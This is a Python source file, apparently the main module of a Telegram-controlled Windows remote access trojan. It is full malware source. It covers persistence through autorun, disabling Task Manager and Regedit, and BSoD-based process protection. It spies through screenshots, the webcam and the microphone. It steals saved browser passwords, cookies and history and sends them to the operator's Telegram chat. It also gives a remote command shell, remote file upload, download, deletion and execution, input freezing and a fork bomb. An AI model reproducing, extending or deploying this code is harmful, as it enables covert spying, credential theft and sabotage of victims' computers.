import re
import os
import sys
import glob
import time
import shutil
import telebot
import requests
import platform
import subprocess
import urllib.request
from subprocess import Popen, PIPE

from RAT import *

from Core.Settings.Antibot import *
from Core.Settings.Antivirus import *
from Core.Settings.Config import *

from Core.Main.Screen import *
from Core.Main.Webcam import *
from Core.Main.Audio import *
from Core.Main.Power import *
from Core.Main.Autorun import *

from Core.Files.Tasklist import *
from Core.Files.Taskkill import *

from Core.Fun.Message import *
from Core.Fun.Speak import *
from Core.Fun.OpenURL import *
from Core.Fun.Wallpapers import *
from Core.Fun.ForkBomb import *

from Core.Stealer.Stealer import *

from Core.Misc.Clipboard import *
from Core.Misc.Freeze import *

from telebot import types
from telebot import util
from telebot import apihelper

bot = telebot.TeleBot(TelegramToken, threaded=True)
bot.worker_pool = util.ThreadPool(num_threads=50)

menu = types.ReplyKeyboardMarkup()
button1 = types.KeyboardButton('/1\n<<')
button2 = types.KeyboardButton('/2\n>>')
button3 = types.KeyboardButton('/Screen\n🖼')
button4 = types.KeyboardButton('/Webcam\n📸')
button5 = types.KeyboardButton('/Video\n🎥')
button6 = types.KeyboardButton('/Audio\n🎙')
button7 = types.KeyboardButton('/Power\n🔴')
button8 = types.KeyboardButton('/Autorun\n🔵')
menu.row(button1, button3, button2)
menu.row(button4, button5, button6)
menu.row(button7, button8)

main2 = types.InlineKeyboardMarkup()
button1 = types.InlineKeyboardButton('Hibernate - 🛑', callback_data='hibernate')
button2 = types.InlineKeyboardButton('Shutdown - ⛔️', callback_data='shutdown')
button3 = types.InlineKeyboardButton('Restart - ⭕️', callback_data='restart')
button4 = types.InlineKeyboardButton('Logoff - 💢', callback_data='logoff')
button5 = types.InlineKeyboardButton('BSoD - 🌀', callback_data='bsod')
button6 = types.InlineKeyboardButton('« Back', callback_data='cancel')
main2.row(button1)
main2.row(button2)
main2.row(button3)
main2.row(button4)
main2.row(button5)
main2.row(button6)

main3 = types.InlineKeyboardMarkup()
button1 = types.InlineKeyboardButton('Add to Startup - 📥', callback_data='startup')
button2 = types.InlineKeyboardButton('Uninstall - ♻️', callback_data='uninstall')
button3 = types.InlineKeyboardButton('« Back', callback_data='cancel')
main3.row(button1)
main3.row(button2)
main3.row(button3)

main4 = types.InlineKeyboardMarkup()
button1 = types.InlineKeyboardButton('Yes, im sure!', callback_data='confirm')
button2 = types.InlineKeyboardButton('Hell no!', callback_data='cancel')
button3 = types.InlineKeyboardButton('« Back', callback_data='cancel')
main4.row(button1)
main4.row(button2)
main4.row(button3)

main5 = types.ReplyKeyboardMarkup()
button1 = types.KeyboardButton('/3\n<<')
button2 = types.KeyboardButton('/Screen\n🖼')
button3 = types.KeyboardButton('/4\n>>')
button4 = types.KeyboardButton('/Files\n💾')
button5 = types.KeyboardButton('/Tasklist\n📋')
button6 = types.KeyboardButton('/Taskkill\n📝')
main5.row(button1, button2, button3)
main5.row(button4)
main5.row(button5, button6)

main6 = types.InlineKeyboardMarkup()
button1 = types.InlineKeyboardButton('Kill all Processes', callback_data='taskkill all')
button2 = types.InlineKeyboardButton('Disable Task Manager', callback_data='disabletaskmgr')
main6.row(button1)
main6.row(button2)

main7 = types.ReplyKeyboardMarkup()
button1 = types.KeyboardButton('/CD\n🗂')
button2 = types.KeyboardButton('/Upload\n📡')
button3 = types.KeyboardButton('/ls\n📄')
button4 = types.KeyboardButton('/Remove\n🗑')
button5 = types.KeyboardButton('/Download\n📨')
button6 = types.KeyboardButton('/Run\n📌')
button7 = types.KeyboardButton('/Cancel')
main7.row(button1, button2, button3)
main7.row(button4, button5, button6)
main7.row(button7)

main8 = types.ReplyKeyboardMarkup()
button1 = types.KeyboardButton('/5\n<<')
button2 = types.KeyboardButton('/Screen\n🖼')
button3 = types.KeyboardButton('/6\n>>')
button4 = types.KeyboardButton('/Message\n💬')
button5 = types.KeyboardButton('/Speak\n📢')
button6 = types.KeyboardButton('/OpenURL\n🌐')
button7 = types.KeyboardButton('/Wallpapers\n🧩')
button8 = types.KeyboardButton('/ForkBomb\n⏱')
main8.row(button1, button2, button3)
main8.row(button4, button5)
main8.row(button6, button7, button8)


# Variables

ProgramData = os.environ['ProgramData']+'\\'
Temp = os.environ['TEMP']+'\\'

Expansion = os.path.splitext(os.path.basename(sys.argv[0]))[1]
CurrentName = os.path.basename(sys.argv[0])
CurrentPath = sys.argv[0]
ProcessName = ProcessName+Expansion


# Sends a message

def SendMessage(call, text):
 bot.edit_message_text(chat_id=call.message.chat.id,
 message_id=call.message.message_id, text=text, parse_mode="Markdown")


# Receive a photo from a Telegram Chat

def GetPhoto(Photo, command):
 file_info = bot.get_file(command.photo[len(command.photo)-1].file_id)
 downloaded_file = bot.download_file(file_info.file_path)
 src = ProgramData+'Files\\'+file_info.file_path;
 with open(src, 'wb') as new_file:
   new_file.write(downloaded_file)


# Proxy Setting

if Proxy is True:
 apihelper.proxy = {'https': 'socks5://{}:{}'.format(Ip,Port)}


# Run as Administrator

if AdminRightsRequired is True:
 if Admin is False:
  WhileRunAS(CurrentPath)
  print('[+] › '+CurrentName+' opened as administrator!\n')


# Checks if the file is running as an administrator


if AdminRightsRequired is True:
 AdminChecker(Admin)


# Disables TaskManager

if DisableTaskManager is True:
 try:
  if os.path.exists(ProgramData+'DisableTaskManager.bat'):
   print('[+] › Task Manager is already disabled!\n')
  else:
   RegeditDisableTaskManager(ProgramData)
   WhileRunAS(ProgramData+'DisableTaskManager.bat')
   print('[+] › Task Manager disabled!\n')
 except:
  pass


# Disables Regedit

if DisableRegistryTools is True:
 try:
  if os.path.exists(ProgramData+'DisableRegistryTools.bat'):
   print('[+] › Regedit is already disabled!\n')
  else:
   time.sleep(1)
   RegeditDisableRegistryTools(ProgramData)
   WhileRunAS(ProgramData+'DisableRegistryTools.bat')
   print('[+] › Regedit is disabled!\n')
 except:
  pass


# Adds a program to startup

if AutorunEnabled is True:
 try:
  if os.path.exists(InstallPath+'\\'+ProcessName):
   print('[+] › '+CurrentName+' ‹ is already in startup › '+InstallPath+'\\'+ProcessName+'\n')
  else:
   AddToAutorun(AutorunName, InstallPath, ProcessName, CurrentPath, Temp)
   print('[+] › '+CurrentName+' ‹ copied to startup › '+InstallPath+'\\'+ProcessName+'\n')
 except:
  pass


# Displays a message on the screen.

if DisplayMessageBox is True:
 try:
  if os.path.exists(Temp+'MessageBox'):
   pass
  else:
   open(Temp+'MessageBox', 'a').close()
   MessageBox(MessageTitle, Message)
 except:
  pass


# Protect process with BSoD (if killed).

if ProcessBSODProtectionEnabled is True:
 if Admin is False:
  WhileRunAS(CurrentPath)
  SetProtection()
  print('[+] › Process protection activated!\n')
 if Admin is True:
  SetProtection()

if ProcessBSODProtectionEnabled is True:
 Argument = none_stop = True
 AdminChecker(Admin)
else:
 Argument = ''


# Sends an online message

while True:
 try:
  if Admin is True:
   Online = '🔘 Online!'
  else:
   Online = '🟢 Online!'

  r = requests.get('http://ip.42.pl/raw')
  IP = r.text
  bot.send_message(TelegramChatID, 
  '\n'+Online+'\n'
  '\nPC » '+os.getlogin()+
  '\nOS » '+platform.system()+' '+platform.release()+
  '\n'
  '\nAV » '+av+
  '\n'
  '\nIP » '+IP,
  reply_markup=menu)

  if os.path.exists(ProgramData+'Files'):
    pass
  else:
    os.makedirs(ProgramData+'Files')
    os.makedirs(ProgramData+'Files\\Documents')
    os.makedirs(ProgramData+'Files\\Photos')
 except:
   print('[-] › No connection!\n')
 else:
   print('[+] › Connected!\n')
   break


# Checks the system for blocked processes

if MakeBSODWhenProcessStarted is True:
 while True:
  try:
   if CheckProcess(BlacklistedProcesses) is True:
    BSoD()
  except:
   pass


# Takes a screenshot

@bot.message_handler(regexp='/Screen')
def Screen(command):
 try:
  bot.send_chat_action(command.chat.id, 'upload_photo')
  File = Temp+'Screenshot.jpg'
  TakeScreenshot(File)
  Screen = open(File, 'rb')
  bot.send_photo(command.chat.id, Screen)
 except:
  pass


# Takes a photo from a webcam

@bot.message_handler(regexp='/Webcam')
def Webcam(command):
 try:
  bot.send_chat_action(command.chat.id, 'upload_photo')
  File = Temp+'Webcam.jpg'
  TakeWebcamPhoto(File)
  Webcam = open(File, 'rb')
  bot.send_photo(command.chat.id, Webcam)
 except:
  bot.send_message(command.chat.id, '*Webcam not found!*', parse_mode="Markdown")


# Takes a video from a webcam

@bot.message_handler(regexp='/Video')
def Video(command):
 try:
  Seconds = re.split('/Video ', command.text, flags=re.I)[1]
  bot.send_message(command.chat.id, '*Recording...*', parse_mode="Markdown")
  bot.send_chat_action(command.chat.id, 'upload_video')
  try:
   File = Temp+'Video.mp4'
   VideoRecorder(Seconds, File)
   Video = open(File, 'rb')
   bot.send_animation(command.chat.id, Video)
  except ValueError:
   bot.send_message(command.chat.id, '*ValueError*', parse_mode="Markdown")
  except:
   bot.send_message(command.chat.id, '*Webcam not found!*', parse_mode="Markdown")
 except:
  bot.send_message(command.chat.id, '*Specify the recording duration\n\n› /Video*', parse_mode="Markdown")


# Records microphone sound

@bot.message_handler(regexp='/Audio')
def Audio(command):
 try:
  Seconds = re.split('/Audio ', command.text, flags=re.I)[1]
  bot.send_message(command.chat.id, '*Recording...*', parse_mode="Markdown")
  bot.send_chat_action(command.chat.id, 'record_audio')
  try:
   File = Temp+'Audio.wav'
   AudioRecorder(Seconds, File)
   Audio = open(File, 'rb')
   bot.send_voice(command.chat.id, Audio)
  except ValueError:
   bot.send_message(command.chat.id, '*ValueError*', parse_mode="Markdown")
  except:
   bot.send_message(command.chat.id, '*Failed to record audio!*', parse_mode="Markdown")
 except:
  bot.send_message(command.chat.id, '*Specify the recording duration\n\n› /Audio*', parse_mode="Markdown")


# Power and startup management

@bot.callback_query_handler(func=lambda call: True)
def callback_inline(command):
 if command.message:
  if command.data == 'hibernate':
   try:
    SendMessage(command, '*Hibernate* command received!')
    Hibernate()
   except:
    pass


  if command.data == 'shutdown':
   try:
    SendMessage(command, '*Shutdown* command received!')
    Shutdown()
   except:
    pass


  if command.data == 'restart':
   try:
    SendMessage(command, '*Restart* command received!')
    Restart()
   except:
    pass


  if command.data == 'logoff':
   try:
    SendMessage(command, '*Logoff* command received!')
    Logoff()
   except:
    pass


  if command.data == 'bsod':
   try:
    SendMessage(command, 'The *Blue Screen of Death* is activated!')
    BSoD()
   except:
    pass


  if command.data == 'startup':
   try:
    if os.path.exists(InstallPath+'\\'+ProcessName):
     SendMessage(command, '*'+ProcessName+'* is already in startup!')
    else:
     AddToAutorun(AutorunName, InstallPath, ProcessName, CurrentPath, Temp)
     SendMessage(command, '*'+ProcessName+'* copied to startup!')
   except:
    SendMessage(command, '*Error*')


  if command.data == 'uninstall':
   bot.edit_message_text(chat_id=command.message.chat.id,
   message_id=command.message.message_id, text='*Are you sure?*', reply_markup=main4, parse_mode="Markdown")


  if command.data == 'confirm':
   try:
    SendMessage(command, '*'+CurrentName+'* uninstalled!')
    Uninstall(AutorunName, InstallPath, ProcessName, CurrentName, CurrentPath, Temp, ProgramData)
   except:
    SendMessage(command, '*Error*')


  if command.data == 'taskkill all':
   try:
    TaskkillAll(CurrentName, Temp)
    SendMessage(command, '*All processes are stopped!*')
   except:
    pass


  if command.data == 'disabletaskmgr':
   try:
    if os.path.exists(ProgramData+'DisableTaskManager.bat'):
      SendMessage(command, '*Task Manager* is already disabled!')
    else:
     RegeditDisableTaskManager(ProgramData)
     WhileRunAS(ProgramData+'DisableTaskManager.bat')
     SendMessage(command, '*Task Manager* disabled!')
   except:
    pass


  if command.data == 'cancel':
    SendMessage(command, '`...`')


# Browse and switch directories

@bot.message_handler(regexp='/CD')
def CD(command):
 try:
  path = re.split('/CD ', command.text, flags=re.I)[1]
  bot.send_chat_action(command.chat.id, 'typing')
  os.chdir(path)
  bot.send_message(command.chat.id, '*Directory changed!*\n\n`'+os.getcwd()+'`', parse_mode="Markdown")
 except FileNotFoundError:
  bot.send_message(command.chat.id, '*Directory not found!*', parse_mode="Markdown")
 except:
  bot.send_message(command.chat.id, '*Current Directory*\n\n`'+os.getcwd()+'`\n\n*Username*\n\n`'+os.getlogin()+'`', parse_mode="Markdown")


# List of files from a directory

@bot.message_handler(regexp='/ls')
def ls(command):
 try:
  bot.send_chat_action(command.chat.id, 'typing')
  dirs = '\n``'.join(os.listdir())
  bot.send_message(command.chat.id, '`'+os.getcwd() + '`\n\n'+'`' + dirs+'`', parse_mode="Markdown")
 except:
  try:
   dirse = '\n'.join(os.listdir())
   splitted_text = util.split_string(dirse, 4096)
   for dirse in splitted_text:
     bot.send_message(command.chat.id, '`'+dirse+'`', parse_mode="Markdown")
  except PermissionError:
   bot.send_message(command.chat.id, '*Access denied!*', parse_mode="Markdown")
  except:
   pass


# Deletes a user selected file

@bot.message_handler(commands=['Remove', 'remove'])
def Remove(command):
 try:
  File = re.split('/Remove ', command.text, flags=re.I)[1]
  bot.send_chat_action(command.chat.id, 'typing')
  created = os.path.getctime(os.getcwd()+'\\'+File)
  year,month,day,hour,minute,second=time.localtime(created)[:-3]
  def convert_bytes(num):
      for x in ['bytes', 'KB', 'MB', 'GB', 'TB']:
          if num < 1024.0:
              return "%3.1f %s" % (num, x)
          num /= 1024.0
  def file_size(file_path):
      if os.path.isfile(file_path):
          file_info = os.stat(file_path)
          return convert_bytes(file_info.st_size)
  bot.send_message(command.chat.id, 
    'File *'+File+'* removed!' 
    '\n' 
    '\nCreated » %02d/%02d/%d'%(day,month,year)+
    '\nSize » '+file_size(os.getcwd()+'\\'+File),
    parse_mode="Markdown")
  os.remove(os.getcwd()+'\\'+File)
 except:
  try:
   created = os.path.getctime(os.getcwd()+'\\'+File)
   year,month,day,hour,minute,second=time.localtime(created)[:-3]
   folder = os.getcwd()+'\\'+File
   folder_size = 0
   for (path, dirs, files) in os.walk(folder):
     for file in files:
       filename = os.path.join(path, file)
       folder_size += os.path.getsize(filename)
   files = folders = 0
   for _, dirnames, filenames in os.walk(os.getcwd()+'\\'+File):
       files += len(filenames)
       folders += len(dirnames)
   shutil.rmtree(os.getcwd()+'\\'+File)
   bot.send_message(command.chat.id, 
     'Folder *'+File+'* removed!'
     '\n'
     '\nCreated » %02d/%02d/%d'%(day,month,year)+
     '\nSize » %0.1f MB' % (folder_size/(1024*1024.0))+
     '\nContained » '+"{:,} Files, {:,} Folders".format(files, folders),
     parse_mode="Markdown")
  except FileNotFoundError:
   bot.send_message(command.chat.id, '*File not found!*', parse_mode="Markdown")
  except PermissionError:
   bot.send_message(command.chat.id, '*Access denied!*', parse_mode="Markdown")
  except:
   bot.send_message(command.chat.id, '*Enter a file name\n\n› /Remove • /RemoveAll*', parse_mode="Markdown")


# Deletes all files from the directory

@bot.message_handler(commands=['RemoveAll', 'removeall'])
def RemoveAll(command):
 try:
  bot.send_message(command.chat.id, '*Removing files...*', parse_mode="Markdown")
  folder = os.getcwd()
  folder_size = 0
  for (path, dirs, files) in os.walk(folder):
    for file in files:
      filename = os.path.join(path, file)
      folder_size += os.path.getsize(filename)
  files = folders = 0
  for _, dirnames, filenames in os.walk(os.getcwd()):
      files += len(filenames)
      folders += len(dirnames)
  a = (len(glob.glob('*')))
  try:
   for file in glob.glob('*.*'):
    if os.path.isfile(file):
      os.remove(file)
   for directory in glob.glob('*/'):
    if os.path.exists(directory):
      shutil.rmtree(directory)
  except PermissionError:
     pass
  b = (len(glob.glob('*')))
  c = (a - b)
  bot.send_message(command.chat.id,
     'Removed *'+str(c)+'* files out of *'+str(a)+'*!'
     '\n'
     '\nSize » %0.1f MB' % (folder_size/(1024*1024.0))+
     '\nContained » '+"{:,} Files, {:,} Folders".format(files, folders),
     parse_mode="Markdown")
 except:
  pass


# Download a file to a connected computer (URL)

@bot.message_handler(regexp='/Upload')
def Upload(command):
 try:
  File = re.split('/Upload ', command.text, flags=re.I)[1]
  req = urllib.request.Request(File, method='HEAD')
  r = urllib.request.urlopen(req)
  file_name = ProgramData+'Files\\'+r.info().get_filename()
  bot.send_message(command.chat.id, '*Uploading file...*', parse_mode="Markdown")
  urllib.request.urlretrieve(File, file_name)
  bot.reply_to(command, '*File uploaded to computer!*\n\n`'+file_name+'`', parse_mode="Markdown")
 except ValueError:
  bot.send_message(command.chat.id, '*ValueError*', parse_mode="Markdown")
 except:
  bot.send_message(command.chat.id, '*Send file or paste link\n\n› /Upload*', parse_mode="Markdown")


# Download a file to a connected computer (Message)

@bot.message_handler(content_types=['document'])
def Document(command):
 try:
  File = bot.get_file(command.document.file_id)
  bot.send_message(command.chat.id, '*Uploading file...*', parse_mode="Markdown")
  downloaded_file = bot.download_file(File.file_path)
  src = ProgramData+'Files\\'+File.file_path;
  with open(src, 'wb') as new_file:
   new_file.write(downloaded_file)
  bot.reply_to(command, '*File uploaded to computer!*\n\n`'+ProgramData+'Files/'+File.file_path+'`', parse_mode="Markdown")
 except FileNotFoundError:
  bot.reply_to(command, '*File format not supported!*', parse_mode="Markdown")
 except:
  bot.reply_to(command, '*You cannot upload a file larger than 20 MB*', parse_mode="Markdown")


# Download the file selected by the user

@bot.message_handler(regexp='/Download')
def download(command):
 try:
  File = re.split('/Download ', command.text, flags=re.I)[1]
  download = open(os.getcwd()+'\\'+File, 'rb')
  bot.send_message(command.chat.id, '*Sending file...*', parse_mode="Markdown")
  bot.send_document(command.chat.id, download)
 except FileNotFoundError:
  bot.send_message(command.chat.id, '*File not found!*', parse_mode="Markdown")
 except:
  try:
   msg = re.split('/Download ', command.text, flags=re.I)[1]
   bot.send_message(command.chat.id, '*Archiving...*', parse_mode="Markdown")
   shutil.make_archive(ProgramData+File,
                           'zip',
                           os.getcwd()+'\\',
                           File)
   file = open(ProgramData+msg+'.zip', 'rb')
   bot.send_message(command.chat.id, '*Sending folder...*', parse_mode="Markdown")
   bot.send_document(command.chat.id, file)
   file.close()
   os.remove(ProgramData+File+'.zip')
  except PermissionError:
   bot.send_message(command.chat.id, '*Access denied!*', parse_mode="Markdown")
  except:
   try:
    file.close()
    os.remove(ProgramData+File+'.zip')
    bot.send_message(command.chat.id, '*You cannot upload a file larger than 50 MB*', parse_mode="Markdown")
   except:
    bot.send_message(command.chat.id, '*Enter a file name\n\n› /Download*', parse_mode="Markdown")


# Runs the file selected by the user

@bot.message_handler(commands=['Run', 'run'])
def Run(command):
 try:
  File = re.split('/Run ', command.text, flags=re.I)[1]
  bot.send_chat_action(command.chat.id, 'typing')
  os.startfile(os.getcwd()+'\\'+File)
  bot.send_message(command.chat.id, 'File *'+File+'* is running!', parse_mode="Markdown")
 except FileNotFoundError:
  bot.send_message(command.chat.id, '*File not found!*', parse_mode="Markdown")
 except:
  bot.send_message(command.chat.id, '*Enter a file name\n\n› /Run • /RunAS*', parse_mode="Markdown")


# Runs the file selected by the user as administrator

@bot.message_handler(commands=['RunAS', 'runas'])
def RunAS(command):
 try:
  File = re.split('/RunAS ', command.text, flags=re.I)[1]
  bot.send_chat_action(command.chat.id, 'typing')
  os.startfile(os.getcwd()+'\\'+File, 'runas')
  bot.send_message(command.chat.id, 'File *'+File+'* is running!', parse_mode="Markdown")
 except FileNotFoundError:
  bot.send_message(command.chat.id, '*File not found!*', parse_mode="Markdown")
 except OSError:
  bot.send_message(command.chat.id, '*Acces denied!*', parse_mode="Markdown")
 except:
  bot.send_message(command.chat.id, '*Enter a file name\n\n› /Run • /RunAS*', parse_mode="Markdown")


# Gets a list of active processes

@bot.message_handler(regexp='/Tasklist')
def Tasklist(command):
 try:
  bot.send_chat_action(command.chat.id, 'typing')
  ProcessList()
  bot.send_message(command.chat.id, '`'+ProcessList()+'`', parse_mode="Markdown")
 except:
  bot.send_message(command.chat.id, '*Failed to get process list!*', parse_mode="Markdown")


# Kills the user selected process

@bot.message_handler(regexp='/Taskkill')
def Taskkill(command):
 try:
  Process = re.split('/Taskkill ', command.text, flags=re.I)[1]
  bot.send_chat_action(command.chat.id, 'typing')
  KillProcess(Process)
  bot.send_message(command.chat.id, 'Process *'+Process+'.exe* stopped!', parse_mode="Markdown")
 except:
  bot.send_message(command.chat.id, 
  '*Enter process name'
  '\n'
  '\n› /Taskkill'
  '\n'
  '\nActive window*'
  '\n'
  '\n`'+WindowTitle()+'`',
  reply_markup=main6, parse_mode="Markdown")


# Displays text sent by user

@bot.message_handler(regexp='/Message')
def Message(command):
 try:
  Message = re.split('/Message ', command.text, flags=re.I)[1]
  bot.send_chat_action(command.chat.id, 'typing')
  bot.reply_to(command, '*The Message is Sent!*', parse_mode="Markdown")
  SendMessageBox(Message)
 except:
  bot.send_message(command.chat.id, '*Enter your message\n\n› /Message*', parse_mode="Markdown")


# Opens a link from a standard browser

@bot.message_handler(regexp='/OpenURL')
def OpenURL(command):
 try:
  URL = re.split('/OpenURL ', command.text, flags=re.I)[1]
  bot.send_chat_action(command.chat.id, 'typing')
  OpenBrowser(URL)
  bot.reply_to(command, '*The URL is Open!*', parse_mode="Markdown")
 except:
  bot.send_message(command.chat.id, '*Enter URL\n\n› /OpenURL*', parse_mode="Markdown")


# Sets the desktop wallpaper

@bot.message_handler(content_types=['photo'])
def Wallpapers(command):
 try:
  Photo = bot.get_file(command.photo[len(command.photo)-1].file_id)
  GetPhoto(Photo, command)
  SetWallpapers(Photo, ProgramData)
  bot.reply_to(command, '*The Photo is Set on the Wallpapers!*', parse_mode="Markdown")
 except:
  pass


# Speak text

@bot.message_handler(regexp='/Speak')
def Speak(command):
 try:
  Text = re.split('/Speak ', command.text, flags=re.I)[1]
  bot.reply_to(command, '*Speaking...*', parse_mode="Markdown")
  try:
   SpeakText(Text)
   bot.send_message(command.chat.id, '*Successfully!*', parse_mode="Markdown")
  except:
   bot.send_message(command.chat.id, '*Failed to speak text!*', parse_mode="Markdown")
 except:
  bot.send_message(command.chat.id, '*Enter text\n\n› /Speak*', parse_mode="Markdown")


# Opens an infinite number of copies of selected programs

@bot.message_handler(regexp='/ForkBomb')
def Forkbomb(command):
 bot.send_message(command.chat.id, '*The ForkBomb is Activated!*', parse_mode="Markdown")
 ForkBomb()


# Retrieves saved passwords from browsers (Opera, Chrome)

@bot.message_handler(regexp='/Passwords')
def Passwords(command):
 try:
  with open(Temp+'Passwords.txt', 'w', encoding='utf-8') as f:
   f.writelines(GetFormattedPasswords())
  Passwords = open(Temp+'Passwords.txt', 'rb')
  bot.send_document(command.chat.id, Passwords)
 except:
  bot.send_message(command.chat.id, '*Passwords not found!*', parse_mode="Markdown")


# Retrieves saved cookies from browsers (Opera, Chrome)

@bot.message_handler(regexp='/Cookies')
def Cookies(command):
 try:
  with open(Temp+'Cookies.txt', 'w', encoding='utf-8') as f:
   f.writelines(GetFormattedCookies())
  Cookies = open(Temp+'Cookies.txt', 'rb')
  bot.send_document(command.chat.id, Cookies)
 except:
  bot.send_message(command.chat.id, '*Cookies not found!*', parse_mode="Markdown")


# Gets saved browser history (Opera, Chrome)

@bot.message_handler(regexp='/History')
def History(command):
 try:
  with open(Temp+'History.txt', 'w', encoding='utf-8') as f:
   f.writelines(GetFormattedHistory())
  History = open(Temp+'History.txt', 'rb')
  bot.send_document(command.chat.id, History)
 except:
  bot.send_message(command.chat.id, '*History not found!*', parse_mode="Markdown")


# Editing and viewing the clipboard

@bot.message_handler(regexp='/Clipboard')
def Clipboard(command):
 try:
  Text = re.split('/Clipboard ', command.text, flags=re.I)[1]
  bot.send_chat_action(command.chat.id, 'typing')
  SetClipboard(Text)
  bot.send_message(command.chat.id, '*Clipboard contents changed!*', parse_mode="Markdown")
 except:
  bot.send_message(command.chat.id,
  '*Enter text'
  '\n'
  '\n› /Clipboard'
  '\n'
  '\nClipboard content*'
  '\n'
  '\n`'+GetClipboard()+'`',
  parse_mode="Markdown")


# Lock input (keyboard and mouse) for the selected number of seconds


@bot.message_handler(regexp='/Freeze')
def Freeze(command):
 if Admin is False:
  bot.send_message(command.chat.id, '*This function requires admin rights!*', parse_mode="Markdown")
 if Admin is True:
  try:
   Seconds = re.split('/Freeze ', command.text, flags=re.I)[1]
   bot.send_message(command.chat.id, '*Keyboard and mouse locked for '+Seconds+' seconds!*', parse_mode="Markdown")
   Block(float(Seconds))
   bot.send_message(command.chat.id, '*Keyboard and mouse are now unlocked!*', parse_mode="Markdown")
  except ValueError:
   bot.send_message(command.chat.id, '*ValueError*', parse_mode="Markdown")
  except OverflowError:
   bot.send_message(command.chat.id, '*OverflowError*', parse_mode="Markdown")
  except:
   bot.send_message(command.chat.id, '*Specify the duration of the lock\n\n› /Freeze*', parse_mode="Markdown")


# Remote command execution (CMD / BAT)

@bot.message_handler(regexp='/CMD')
def CMD(command):
 try:
  shell = re.split('/CMD ', command.text, flags=re.I)[1]
  bot.send_chat_action(command.chat.id, 'typing')
  cmd = subprocess.Popen(shell, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
  lines = []
  for line in cmd.stdout.readlines():
      line = line.strip()
      if line:
          lines.append(line.decode('cp866'))
          Output = '\n'.join(lines)
  bot.send_message(command.chat.id, Output)
 except:
  try:
   splitted_text = util.split_string(Output, 4096)
   for Output in splitted_text:
    bot.send_message(command.chat.id, Output)
  except:
   bot.send_message(command.chat.id, '*Enter command\n\n› /CMD*', parse_mode="Markdown")

# Navigation buttons

@bot.message_handler(commands=['3', '6'])
def Main(command):
 bot.send_message(command.chat.id, '`...`', reply_markup=menu, parse_mode="Markdown")

@bot.message_handler(commands=['2', '5'])
def Main(command):
 bot.send_message(command.chat.id, '`...`', reply_markup=main5, parse_mode="Markdown")

@bot.message_handler(commands=['4', '1'])
def Main(command):
 bot.send_message(command.chat.id, '`...`', reply_markup=main8, parse_mode="Markdown")

@bot.message_handler(commands=['Power', 'power'])
def Power(command):
 bot.send_message(command.chat.id, '*Select an action*', reply_markup=main2, parse_mode="Markdown")

@bot.message_handler(commands=['Autorun', 'autorun'])
def Autorun(command):
 bot.send_message(command.chat.id, '*Select an action*', reply_markup=main3, parse_mode="Markdown")

@bot.message_handler(commands=['Files', 'files'])
def Files(command):
 bot.send_message(command.chat.id, '`...`', reply_markup=main7, parse_mode="Markdown")

@bot.message_handler(commands=['Cancel'])
def CancelFiles(command):
 bot.send_message(command.chat.id, '`...`', reply_markup=main5, parse_mode="Markdown")

@bot.message_handler(commands=['Wallpapers', 'wallpapers'])
def Wallpapers(command):
 bot.send_message(command.chat.id, '*Send photo*', parse_mode="Markdown")

@bot.message_handler(commands=['Help', 'help'])
def Help(command):
 bot.send_message(command.chat.id,
  'ᅠᅠᅠᅠ ⚙️ *Commands* ⚙️'
  '\n'
  '\n'
  '\n*/Screen* -  Desktop Capture'
  '\n*/Webcam* - Webcam Capture'
  '\n*/Video* - Webcam Video Capture'
  '\n*/Audio* - Sound Capture'
  '\n*/Power* - Computer Power'
  '\n*/Autorun* - Startup Management'
  '\n'
  '\n*/Files* - Files Manager'
  '\n› */CD* - Current Directory'
  '\n› */ls* - List of Files'
  '\n› */Remove* - Remove a File'
  '\n› */Upload* - Upload File'
  '\n› */Download* - Download File'
  '\n› */Run* - Run File'
  '\n*/Tasklist* - Process list'
  '\n*/Taskkill* - Process Kill'
  '\n'
  '\n*/Message* - Send Message'
  '\n*/Speak* - Speak Message'
  '\n*/OpenURL* - Open URL'
  '\n*/Wallpapers* - Set Wallpapers'
  '\n*/ForkBomb* - Launch programs'
  '\n'
  '\n*/Passwords* - Get Passwords'
  '\n*/Cookies* - Get Cookies'
  '\n*/History* - Get History'
  '\n'
  '\n*/Clipboard* - Clipboard editing'
  '\n*/Freeze* - Block Input'
  '\n*/CMD* - Remote Shell'
  '\n'
  '\n'
  '\n*Coded by Bainky | @bainki 👾*', 
  reply_markup=menu, parse_mode="Markdown")


try:
 bot.polling(Argument)
except:
 os.startfile(CurrentPath)
 sys.exit()
